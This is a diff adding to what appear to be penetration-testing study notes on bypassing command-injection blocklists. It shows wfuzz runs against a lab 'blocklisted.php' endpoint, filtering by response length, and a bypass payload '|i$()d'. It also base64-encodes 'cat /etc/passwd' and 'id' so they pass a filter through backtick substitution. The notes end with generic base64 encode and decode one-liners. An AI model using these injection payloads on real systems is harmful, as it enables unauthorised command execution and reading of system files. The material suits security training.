@@ -110,4 +110,65 @@ FAIL_INTENT|`echo 'aWQK' |base64 -d`
 FAIL_INTENT||`echo 'aWQK' |base64 -d`
 ```
 
+```shell
+/usr/share/SecLists/command_injection_custom.txt
+```
+
+Our list includes an additional "bogus" string so we can guarantee a failed response length when fuzzing, or at least gain an interesting response, which we could render in our browser.
+
+This is important because having a known response size when fuzzing a target endpoint is exceptionally useful when we're filtering our results for successful attempts (or verbose error messages at the very least).
+
+```shell
+wfuzz -c -z file,/usr/share/SecLists/command_injection_custom.txt --hc 404 http://target:80/php/blocklisted.php?ip=127.0.0.1FUZZ
+```
+
+We have a lot of failed attempts that give us a response length of 1156 bytes. Let's hide these requests by providing wfuzz with the parameter-value combination of --hh 1156.
+
+```shell
+wfuzz -c -z file,/usr/share/SecLists/command_injection_custom.txt --hc 404 --hh 1156 http://target:80/php/blocklisted.php?ip=127.0.0.1FUZZ
+```
+
+Let's load the payload of "|i$()d" from our Wfuzz output into our browser and note the response.
+
+```url
+http://target/php/blocklisted.php?ip=127.0.0.1|i$()d
+```
+
+Before we conclude, let's examine one other possible attack vector to bypass blocklisted strings entirely if a backtick (`) character is permitted. This can be achieved by using base64 encoding.
+
+All we need to do is choose the payload we want, and echo it into the base64 binary on our attacking Kali Linux VM.
+
+```shell
+echo "cat /etc/passwd" |base64
+```
+
+# 🔄 Alternatives to `base64` Binary (Encode/Decode)
+
+# ✅ Python (Preferred if available)
+# Encode
+python3 -c "import base64; print(base64.b64encode(open('input.txt','rb').read()).decode())"
+
+# Decode
+python3 -c "import base64; open('output.txt','wb').write(base64.b64decode(open('input.b64','r').read()))"
+
+# ✅ OpenSSL
+# Encode
+openssl base64 -in input.txt -out output.b64
+
+# Decode
+openssl base64 -d -in output.b64 -out decoded.txt
+
+# ✅ Perl
+# Encode
+perl -MMIME::Base64 -0777 -ne 'print encode_base64($_)' < input.txt
+
+# Decode
+perl -MMIME::Base64 -ne 'print decode_base64($_)' < input.b64
+
+# ✅ BusyBox (if available)
+# Encode
+busybox base64 input.txt
+
+# Decode
+busybox base64 -d input.b64
 
